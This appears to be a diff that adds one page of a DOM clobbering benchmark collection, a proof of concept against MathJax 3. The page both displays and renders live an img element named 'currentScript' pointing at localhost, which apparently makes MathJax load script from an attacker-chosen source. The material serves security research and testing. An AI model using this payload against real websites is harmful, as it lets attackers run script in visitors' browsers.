@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DOM Clobbering Micro Benchmarks</title>
+    <link rel="stylesheet" href="../styles/styles.css">
+    <style>
+        /* Ensure that long lines in <pre> tags wrap */
+        pre {
+            white-space: pre-wrap;       /* CSS3 */
+            white-space: -moz-pre-wrap;  /* Mozilla */
+            white-space: -pre-wrap;      /* Opera 4-6 */
+            white-space: -o-pre-wrap;    /* Opera 7 */
+            word-wrap: break-word;       /* IE */
+        }
+    </style>
+</head>
+<body>
+<h1>DOM Clobbering Collection - mathjax3</h1>
+
+<section class="section">
+  <div class="column">
+  <p><span class="label">Payload</span><br><br>
+  <pre>&lt;img name=&quot;currentScript&quot; src=&quot;http://localhost:9999&quot;&gt;&lt;/img&gt;</pre>
+  <img name="currentScript" src="http://localhost:9999"></img>
+  </div>
+</section>
+
+<section class="section">
+  <div class="column">
+  <p><span class="label">Library</span><br><br>
+  <pre>&lt;script id=&quot;MathJax-script&quot; async src=&quot;https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js&quot;&gt;&lt;/script&gt;
+$$\require{tex}$$</pre>
+  <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+$$\require{tex}$$
+  </div>
+</section>
+
+<section class="section">
+  <div class="column">
+  <a href="../mavo/poc.html">Next: mavo</a>
+  </div>
+</section>
+
+</body>
+</html>
